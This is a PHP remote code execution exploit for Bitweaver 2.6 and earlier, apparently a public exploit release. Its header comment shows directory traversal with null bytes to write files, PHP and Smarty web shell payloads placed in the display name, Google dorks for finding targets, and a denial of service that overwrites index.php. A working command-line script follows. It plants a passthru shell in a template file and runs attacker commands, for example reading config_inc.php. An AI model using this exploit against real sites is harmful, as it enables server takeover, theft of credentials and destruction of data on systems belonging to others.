&lt;?php
    /*
    Bitweaver &lt;= 2.6 /boards/boards_rss.php / saveFeed() remote code execution exploit
    by Nine:Situations:Group::bookoo
     
    php.ini independent
     
    site: http://retrogod.altervista.org/
    software site: http://www.bitweaver.org/
     
    You need an user account and you need to change your &quot;display name&quot; in:
     
    {php}passthru($_SERVER[HTTP_CMD]);{/php}
     
    Register and click on Preferences, look at the &quot;User Information&quot; tab, inside the
    &quot;Real name&quot; text field write the code above, then click on Change.
     
    Google dorks:
    &quot;by bitweaver&quot; Version  powered +boards
    &quot;You are running bitweaver in TEST mode&quot;|&quot;bitweaver * White Screen of Death&quot;
     
    Versions tested: 2.6.0, 2.0.2
     
    Vulnerability type: folder creation, file creation, file overwrite, PHP code injection.
     
    Explaination:
    look at /boards/boards_rss.php, line 102:
    ...
    echo $rss-&gt;saveFeed( $rss_version_name, $cacheFile );
    ...
     
    it calls saveFeed() function in an insecure way, arguments are built on
    $_REQUEST[version] var and may contain directory traversal sequences...
     
    now look at saveFeed() function in /rss/feedcreator.class.php
     
    ...
    function saveFeed($filename=&quot;&quot;, $displayContents=true) {
    if ($filename==&quot;&quot;) {
    $filename = $this-&gt;_generateFilename();
    }
    if ( !is_dir( dirname( $filename ))) {
    mkdir_p( dirname( $filename ));
    }
    $feedFile = fopen($filename, &quot;w+&quot;);
    if ($feedFile) {
    fputs($feedFile,$this-&gt;createFeed());
    fclose($feedFile);
    if ($displayContents) {
    $this-&gt;_redirect($filename);
    }
    } else {
    echo &quot;&lt;br /&gt;&lt;b&gt;Error creating feed file, please check write permissions.&lt;/b&gt;&lt;br /&gt;&quot;;
    }
    }
     
    }
    ...
     
    regardless of php.ini settings, you can create arbitrary folders, create/overwrite
    files, also you can end the path with an arbitrary extension, other than .xml passing
    a null char.
    ex.
     
    http://host/path_to_bitweaver/boards/boards_rss.php?version=/../../../../bookoo.php%00
     
    now you have a bookoo.php in main folder:
     
    &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
    &lt;!-- generator=&quot;FeedCreator 1.7.2&quot; --&gt;
    &lt;?xml-stylesheet href=&quot;http://www.w3.org/2000/08/w3c-synd/style.css&quot; type=&quot;text/css&quot;?&gt;
    &lt;rss version=&quot;0.91&quot;&gt;
    &lt;channel&gt;
    &lt;title&gt; Feed&lt;/title&gt;
    &lt;description&gt;&lt;/description&gt;
    &lt;link&gt;http://192.168.0.1&lt;/link&gt;
    &lt;lastBuildDate&gt;Sat, 09 May 2009 20:01:44 +0100&lt;/lastBuildDate&gt;
    &lt;generator&gt;FeedCreator 1.7.2&lt;/generator&gt;
    &lt;language&gt;en-us&lt;/language&gt;
    &lt;/channel&gt;
    &lt;/rss&gt;
     
    You could inject php code by the Host header (but this is used to build filenames and
    create problems, also most of servers will respond with an http error) inside link tag
    or by your &quot;display name&quot; in title tag, ex.:
     
    http://host/path_to_bitweaver/boards/boards_rss.php?version=/../../../../bookoo_ii.php%00&amp;u=bookoo&amp;p=password
     
    and here it is the new file (if your display name is &quot;&lt;?php passthru($_GET[cmd]; ?&gt;&quot;):
     
    &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
    &lt;!-- generator=&quot;FeedCreator 1.7.2&quot; --&gt;
    &lt;?xml-stylesheet href=&quot;http://www.w3.org/2000/08/w3c-synd/style.css&quot; type=&quot;text/css&quot;?&gt;
    &lt;rss version=&quot;0.91&quot;&gt;
    &lt;channel&gt;
    &lt;title&gt; Feed (&lt;?php passthru($_GET[cmd]; ?&gt;))&lt;/title&gt;
    &lt;description&gt;&lt;/description&gt;
    &lt;link&gt;http://192.168.0.1&lt;/link&gt;
    &lt;lastBuildDate&gt;Tue, 12 May 2009 00:30:54 +0100&lt;/lastBuildDate&gt;
    &lt;generator&gt;FeedCreator 1.7.2&lt;/generator&gt;
    &lt;language&gt;en-us&lt;/language&gt;
    &lt;/channel&gt;
    &lt;/rss&gt;
     
    if short_open_tag in php.ini is off (because of &quot;&lt;?xml ...&quot; preamble
    generating a parse error with short_open_tag = on), you can now launch commands:
     
    http://host/path_to_bitweaver/bookoo_ii.php?cmd=ls
     
    However, to bypass short_open_tag = on you can inject in a template file, ex.:
     
    http://host/path_to_bitweaver/boards/boards_rss.php?version=/../../../../themes/templates/footer_inc.tpl%00&amp;u=bookoo&amp;p=password
     
    Now footer_inc.tpl looks like this:
     
    &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
    &lt;!-- generator=&quot;FeedCreator 1.7.2&quot; --&gt;
    &lt;?xml-stylesheet href=&quot;http://www.w3.org/2000/08/w3c-synd/style.css&quot; type=&quot;text/css&quot;?&gt;
    &lt;rss version=&quot;0.91&quot;&gt;
    &lt;channel&gt;
    &lt;title&gt; Feed ({php}passthru($_GET[CMD]);{/php})&lt;/title&gt;
    &lt;description&gt;&lt;/description&gt;
    &lt;link&gt;http://192.168.0.1&lt;/link&gt;
    &lt;lastBuildDate&gt;Tue, 12 May 2009 00:43:01 +0100&lt;/lastBuildDate&gt;
    &lt;generator&gt;FeedCreator 1.7.2&lt;/generator&gt;
    &lt;language&gt;en-us&lt;/language&gt;
    &lt;/channel&gt;
    &lt;/rss&gt;
     
    note that the shellcode is in Smarty template syntax ...
     
    Now you can launch commands from the main page:
     
    http://host/path_to_bitweaver/index.php?cmd=ls%20-la
     
    or
     
    http://host/path_to_bitweaver/wiki/index.php?cmd=ls%20-la
     
    Additional notes:
     
    Without to have an account you can create a denial of service condition, ex. by replacing the main index.php:
     
    http://host/path_to_bitweaver/boards/boards_rss.php?version=/../../../../index.php%00
     
    I found also a bug in Smarty template system, against windows servers you can launch commands
    with this:
     
    {math equation=&quot;`^C^A^L^C`&quot;}
     
    They filtered non-math functions, but they forgot php bacticks operators. This is
    the same of launch exec() !
     
    */
    $err[0] = &quot;[!] This script is intended to be launched from the cli!&quot;;
    $err[1] = &quot;[!] You need the curl extesion loaded!&quot;;
     
    if (php_sapi_name() &lt;&gt; &quot;cli&quot;) {
        die($err[0]);
    }
    if (!extension_loaded(&#039;curl&#039;)) {
        $win = (strtoupper(substr(PHP_OS, 0, 3)) === &#039;WIN&#039;) ? true :
        false;
        if ($win) {
            !dl(&quot;php_curl.dll&quot;) ? die($err[1]) :
            nil;
        } else {
            !dl(&quot;php_curl.so&quot;) ? die($err[1]) :
            nil;
        }
    }
     
    function syntax() {
        print (
        &quot;Syntax: php &quot;.$argv[0].&quot; [host] [path] [user] [pass] [cmd] [options]   \n&quot;. &quot;Options:                                                               \n&quot;. &quot;--port:[port]       - specify a port                                   \n&quot;. &quot;                      default-&gt;80                                      \n&quot;. &quot;--proxy:[host:port] - use proxy                                        \n&quot;. &quot;Examples:   php &quot;.$argv[0].&quot; 192.168.0.1 /bitweaver/ bookoo pass ls    \n&quot;. &quot;            php &quot;.$argv[0].&quot; 192.168.0.1 / bookoo pass ls -a --proxy:1.1.1.1:8080\n&quot;. &quot;            php &quot;.$argv[0].&quot; 192.168.0.1 / bookoo pass cat ../kernel/config_inc.php --port:81&quot;);
        die();
    }
     
     
    error_reporting(E_ALL);
    $host = $argv[1];
    $path = $argv[2];
    $_usr = $argv[3];
    $_pwd = $argv[4];
    $_cmd = &quot;&quot;;
    for ($i = 5; $i &lt; $argc; $i++) {
        if ((!strstr($argv[$i], &quot;--proxy:&quot;)) and (!strstr($argv[$i], &quot;--port:&quot;))) {
            $_cmd .= &quot; &quot;.$argv[$i];
        }
    }
    $argv[5] ? print(&quot;[*] Command-&gt;$_cmd\n&quot;) :
     syntax();
    $_use_proxy = false;
    $port = 80;
     
    for ($i = 3; $i &lt; $argc; $i++) {
        if (stristr($argv[$i], &quot;--proxy:&quot;)) {
            $_use_proxy = true;
            $tmp = explode(&quot;:&quot;, $argv[$i]);
            $proxy_host = $tmp[1];
            $proxy_port = (int)$tmp[2];
        }
        if (stristr($argv[$i], &quot;--port:&quot;)) {
            $tmp = explode(&quot;:&quot;, $argv[$i]);
            $port = (int)$tmp[1];
        }
    }
     
    function _s($url, $cmd, $is_post, $request) {
        global $_use_proxy, $proxy_host, $proxy_port, $cookie;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        if ($is_post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $request.&quot;\r\n&quot;);
        }
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, &quot;Googlebot/1.0 (googlebot@googlebot.com http://googlebot.com/)&quot;);
        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        $headers = array(&quot;Cookie: $cookie&quot;, &quot;Cmd: &quot;.$cmd.&quot; &gt; ./../readme&quot;);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
         
        if ($_use_proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.&quot;:&quot;.$proxy_port);
        }
        $_d = curl_exec($ch);
        if (curl_errno($ch)) {
            die(&quot;[!] &quot;.curl_error($ch).&quot;\n&quot;);
        } else {
            curl_close($ch);
        }
        return $_d;
    }
     
    $my_template = &quot;themes/templates/footer_inc.tpl&quot;;
    $url = &quot;http://$host:$port&quot;.$path.&quot;boards/boards_rss.php&quot;;
    $_o = _s($url, &quot;&quot;, 0, &quot;&quot;);
    if (stristr($_o, &quot;404 Not Found&quot;)) {
        die (&quot;[!] Vulnerable script not found!\n&quot;);
    }
    //catch site cookie, this is needed for version compatibility, not needed in 2.6.0
    $_tmp = explode(&quot;Set-Cookie: &quot;, $_o);
    $cookie = &quot;&quot;;
    for ($i = 1; $i &lt; count($_tmp); $i++) {
        $_tmpii = explode(&quot;;&quot;, $_tmp[$i]);
         $cookie .= $_tmpii[0].&quot;; &quot;;
    }
    print(&quot;[*] Cookie-&gt;&quot;.$cookie.&quot;\n&quot;);
    $_o = _s($url, &quot;&quot;, 1, &quot;version=/\x00&amp;&quot;);
    $_o = _s($url, &quot;&quot;, 1, &quot;u=$_usr&amp;p=$_pwd&amp;version=/../../../../$my_template\x00&amp;&quot;);
    if (stristr($_o, &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;&quot;)) {
        print (&quot;[*] &#039;$my_template&#039; successfully overwritten!\n&quot;);
    } else {
        print($_o);
        die(&quot;[!] Error! No write permission on /&quot;.$my_template.&quot; ...&quot;);
    }
    if (stristr($_o, &quot;{php}passthru(\$_SERVER[HTTP_CMD]);{/php}&quot;)) {
        print (&quot;[*] Shell injected!\n&quot;);
    } else {
        print($_o);
        die(&quot;[!] Error! Shell not injected!&quot;);
    }
    $url = &quot;http://$host:$port&quot;.$path.&quot;wiki/index.php&quot;;
    $_o = _s($url, $_cmd, 0, &quot;&quot;);
    $url = &quot;http://$host:$port&quot;.$path.&quot;readme&quot;;
    $_o = _s($url, &quot;&quot;, 0, &quot;&quot;);
    if (stristr($_o, &quot;404 Not Found&quot;)) {
        die (&quot;[!] stdout file not found!\n&quot;);
    } else {
        print(&quot;[*] Success!\n&quot;.$_o);
    }
?&gt;
